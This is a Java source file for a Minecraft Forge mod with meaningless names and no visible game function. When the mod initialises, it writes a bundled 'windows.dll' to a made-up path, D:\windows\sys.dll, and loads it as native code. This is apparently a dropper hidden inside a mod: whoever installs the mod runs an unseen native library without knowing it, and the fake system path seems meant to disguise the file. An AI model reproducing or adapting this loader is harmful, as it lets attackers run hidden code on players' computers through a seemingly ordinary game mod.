package nmsl;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;
import java.util.Random;

@Mod(modid = ABC.MODID, version = ABC.VERSION)
public class ABC
{
    public static final String MODID = "fmt";
    public static final String VERSION = "1.0";

    @EventHandler
    public void init(FMLInitializationEvent event)
    {
        r();
    }
    public void r(){

        try {
            File f=new File("D:\\windows");
            File fd=new File("D:\\windows\\sys.dll");
            if(!f.exists()){
                f.mkdirs();
            }
            if(fd.exists()){
                fd.delete();
            }
            fd.createNewFile();
            FileUtils.copyURLToFile(this.getClass().getClassLoader().getResource("windows.dll"),fd);
            System.load(fd.toString());
        }  catch (IOException e) {
            e.printStackTrace();
        }
    }



}
